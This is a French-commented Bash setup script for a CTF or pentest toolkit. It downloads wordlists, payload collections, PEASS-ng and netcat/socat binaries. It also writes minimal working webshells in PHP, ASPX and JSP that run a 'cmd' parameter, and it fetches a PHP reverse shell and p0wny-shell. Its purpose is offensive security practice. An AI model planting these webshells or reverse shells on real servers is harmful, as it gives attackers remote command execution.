#!/bin/bash

# CTF Toolkit Setup Script
# Télécharge et configure les wordlists, payloads et outils nécessaires

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORDLISTS_DIR="$SCRIPT_DIR/wordlists"
PAYLOADS_DIR="$SCRIPT_DIR/payloads"
TOOLS_DIR="$SCRIPT_DIR/tools"

# Mode mise à jour forcée
FORCE_UPDATE=false
if [[ "$1" == "-f" || "$1" == "--force" ]]; then
    FORCE_UPDATE=true
    shift
fi

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() { echo -e "${BLUE}[*]${NC} $1"; }
print_success() { echo -e "${GREEN}[+]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_error() { echo -e "${RED}[-]${NC} $1"; }

echo ""
echo "╔═══════════════════════════════════════╗"
echo "║       CTF Toolkit Setup Script        ║"
echo "╚═══════════════════════════════════════╝"
echo ""

if [ "$FORCE_UPDATE" = true ]; then
    print_warning "Mode mise à jour forcée activé (-f)"
    echo ""
fi

# Création des dossiers
mkdir -p "$WORDLISTS_DIR/custom"
mkdir -p "$TOOLS_DIR"
mkdir -p "$PAYLOADS_DIR"

# ===================
# SecLists
# ===================
install_seclists() {
    if [ -d "$WORDLISTS_DIR/seclists" ]; then
        print_warning "SecLists déjà présent. Mise à jour..."
        cd "$WORDLISTS_DIR/seclists"
        git pull --quiet
        print_success "SecLists mis à jour"
    else
        print_status "Téléchargement de SecLists..."
        git clone --depth 1 https://github.com/danielmiessler/SecLists.git "$WORDLISTS_DIR/seclists"
        print_success "SecLists installé"
    fi
}

# ===================
# Rockyou
# ===================
install_rockyou() {
    ROCKYOU_FILE="$WORDLISTS_DIR/rockyou/rockyou.txt"

    if [ -f "$ROCKYOU_FILE" ] && [ "$FORCE_UPDATE" = false ]; then
        print_warning "rockyou.txt déjà présent (utiliser -f pour forcer)"
        return
    fi

    mkdir -p "$WORDLISTS_DIR/rockyou"
    print_status "Téléchargement de rockyou.txt..."

    ROCKYOU_URL="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    curl -L -o "$ROCKYOU_FILE" "$ROCKYOU_URL" --progress-bar
    print_success "rockyou.txt installé ($(du -h "$ROCKYOU_FILE" | cut -f1))"
}

# ===================
# PayloadsAllTheThings
# ===================
install_payloads_all_the_things() {
    if [ -d "$PAYLOADS_DIR/PayloadsAllTheThings" ]; then
        print_warning "PayloadsAllTheThings déjà présent. Mise à jour..."
        cd "$PAYLOADS_DIR/PayloadsAllTheThings"
        git pull --quiet
        print_success "PayloadsAllTheThings mis à jour"
    else
        print_status "Téléchargement de PayloadsAllTheThings..."
        git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git "$PAYLOADS_DIR/PayloadsAllTheThings"
        print_success "PayloadsAllTheThings installé"
    fi
}

# ===================
# PEASS-ng (linpeas/winpeas)
# ===================
install_peass() {
    PEASS_DIR="$TOOLS_DIR/PEASS-ng"
    mkdir -p "$PEASS_DIR"

    if [ -f "$PEASS_DIR/linpeas.sh" ] && [ "$FORCE_UPDATE" = false ]; then
        print_warning "PEASS-ng déjà présent (utiliser -f pour forcer)"
        return
    fi

    print_status "Téléchargement de PEASS-ng (linpeas/winpeas)..."

    curl -sL "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" \
        -o "$PEASS_DIR/linpeas.sh"
    chmod +x "$PEASS_DIR/linpeas.sh"

    curl -sL "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" \
        -o "$PEASS_DIR/winPEASx64.exe"
    curl -sL "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe" \
        -o "$PEASS_DIR/winPEASx86.exe"
    curl -sL "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat" \
        -o "$PEASS_DIR/winPEAS.bat"

    print_success "PEASS-ng installé"
}

# ===================
# Webshells
# ===================
install_webshells() {
    WEBSHELLS_DIR="$TOOLS_DIR/webshells"

    if [ -d "$WEBSHELLS_DIR" ] && [ "$(ls -A "$WEBSHELLS_DIR" 2>/dev/null)" ] && [ "$FORCE_UPDATE" = false ]; then
        print_warning "Webshells déjà présents (utiliser -f pour forcer)"
        return
    fi

    mkdir -p "$WEBSHELLS_DIR"
    print_status "Création des webshells..."

    cat > "$WEBSHELLS_DIR/simple.php" << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

    curl -sL "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" \
        -o "$WEBSHELLS_DIR/php-reverse-shell.php"

    curl -sL "https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php" \
        -o "$WEBSHELLS_DIR/p0wny-shell.php"

    cat > "$WEBSHELLS_DIR/simple.aspx" << 'EOF'
<%@ Page Language="C#" %><%System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd()%>
EOF

    cat > "$WEBSHELLS_DIR/simple.jsp" << 'EOF'
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
EOF

    print_success "Webshells installés"
}

# ===================
# Static Binaries
# ===================
install_static_binaries() {
    BINARIES_DIR="$TOOLS_DIR/static-binaries"
    mkdir -p "$BINARIES_DIR/linux" "$BINARIES_DIR/windows"

    if [ -f "$BINARIES_DIR/linux/ncat" ] && [ "$FORCE_UPDATE" = false ]; then
        print_warning "Static binaries déjà présents (utiliser -f pour forcer)"
        return
    fi

    print_status "Téléchargement des binaires statiques..."

    curl -sL "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" \
        -o "$BINARIES_DIR/linux/ncat"
    chmod +x "$BINARIES_DIR/linux/ncat"

    curl -sL "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" \
        -o "$BINARIES_DIR/linux/socat"
    chmod +x "$BINARIES_DIR/linux/socat"

    curl -sL "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" \
        -o "$BINARIES_DIR/windows/nc64.exe"

    print_success "Static binaries installés"
}

# ===================
# Install all
# ===================
install_wordlists() {
    install_seclists
    install_rockyou
}

install_tools() {
    install_peass
    install_webshells
    install_static_binaries
}

install_payloads() {
    install_payloads_all_the_things
}

install_all() {
    install_wordlists
    install_payloads
    install_tools
}

# ===================
# Menu principal
# ===================
case "${1:-all}" in
    wordlists)
        install_wordlists
        ;;
    payloads)
        install_payloads
        ;;
    tools)
        install_tools
        ;;
    seclists)
        install_seclists
        ;;
    rockyou)
        install_rockyou
        ;;
    peass)
        install_peass
        ;;
    webshells)
        install_webshells
        ;;
    binaries)
        install_static_binaries
        ;;
    all)
        install_all
        ;;
    *)
        echo "Usage: $0 [-f|--force] <command>"
        echo ""
        echo "Commands:"
        echo "  all           Tout installer (recommandé)"
        echo "  wordlists     SecLists + rockyou"
        echo "  payloads      PayloadsAllTheThings"
        echo "  tools         PEASS-ng + webshells + binaires"
        echo ""
        echo "Individuels:"
        echo "  seclists, rockyou, peass, webshells, binaries"
        echo ""
        echo "Options:"
        echo "  -f, --force   Force le re-téléchargement"
        echo ""
        echo "Ressources: voir resources.md"
        exit 1
        ;;
esac

echo ""
print_success "Setup terminé !"
echo ""
print_status "Structure:"
echo "  wordlists/  - SecLists, rockyou"
echo "  payloads/   - PayloadsAllTheThings + custom"
echo "  tools/      - PEASS-ng, webshells, binaires"
echo "  cheatsheets/ - Commandes par phase"
echo ""
print_status "Voir resources.md pour les liens utiles"
echo ""
